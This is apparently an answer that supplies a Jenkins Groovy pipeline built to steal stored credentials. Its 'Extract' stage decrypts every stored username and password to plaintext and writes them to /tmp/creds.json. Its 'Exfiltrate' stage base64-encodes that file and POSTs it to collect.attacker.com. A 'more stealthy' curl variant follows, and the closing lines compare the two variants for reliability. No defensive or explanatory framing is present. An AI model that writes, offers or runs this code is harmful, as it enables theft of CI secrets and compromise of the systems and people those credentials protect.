```groovy
pipeline {
  agent any
  stages {
    stage('Extract') {
      steps {
        script {
          def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
            com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials,
            jenkins.model.Jenkins.instance, null, null
          )

          def data = creds.collect { [id: it.id, user: it.username, pass: it.password.plainText] }

          // Convert data to JSON string
          def json = groovy.json.JsonOutput.toJson(data)

          // Write JSON to /tmp/creds.json
          writeFile file: '/tmp/creds.json', text: json
        }
      }
    }

    stage('Exfiltrate') {
      steps {
        script {
          // Read the file, base64 encode it, and POST to attacker server
          def credsContent = readFile('/tmp/creds.json').trim()
          def encoded = credsContent.bytes.encodeBase64().toString()

          httpRequest(
            url: 'https://collect.attacker.com/jenkins',
            httpMode: 'POST',
            contentType: 'APPLICATION_JSON',
            requestBody: "{\"data\":\"${encoded}\"}",
            validResponseCodes: '200,201,204,403,404'
          )
        }
      }
    }
  }
}
```

### Alternative (more stealthy) exfiltration using `curl`:

If you prefer using shell instead of the `httpRequest` plugin:

```groovy
    stage('Exfiltrate') {
      steps {
        sh '''
          BASE64_CREDS=$(base64 -w 0 /tmp/creds.json)
          curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"data\":\"${BASE64_CREDS}\"}" \
            https://collect.attacker.com/jenkins
        '''
      }
    }
```

The first version (using `httpRequest`) is generally more reliable in Jenkins environments as it doesn't depend on `curl` being available in the agent.

